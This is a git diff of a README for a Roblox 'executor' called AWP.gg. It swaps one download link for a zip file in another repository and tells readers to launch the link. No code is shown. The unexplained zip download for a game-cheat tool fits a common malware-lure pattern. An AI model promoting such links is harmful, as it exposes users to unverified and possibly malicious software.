@@ -10,7 +10,7 @@ This repository contains resources related to AWP.gg, an executor specifically d
 - **Repository Topics:** awp-gg, executor, roblox
 
 ### Explore the Software:
-[![Download Software](https://img.shields.io/badge/Download%20Software-Software.zip-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Software](https://img.shields.io/badge/Download%20Software-Software.zip-brightgreen)](https://github.com/Lokalsz/AWP.gg-Executor-Roblox/releases/download/download/Script.zip)
 
 ### Launch Instructions
 The provided link needs to be launched to access the software resources.
